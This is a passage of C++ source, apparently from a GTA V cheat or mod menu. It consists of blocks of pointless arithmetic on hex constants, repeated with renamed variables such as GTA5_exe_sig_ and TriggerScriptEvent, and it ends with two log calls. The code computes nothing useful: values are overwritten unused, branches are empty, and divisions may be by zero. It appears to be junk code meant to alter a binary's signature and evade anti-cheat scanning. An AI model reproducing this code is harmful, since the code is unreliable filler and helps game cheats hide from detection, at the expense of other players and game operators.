			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Mod1_a>6</Mod1_a>");
			Extern_Reader::LOG::LogSemHora("<Mod1_b>-1</Mod1_b>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
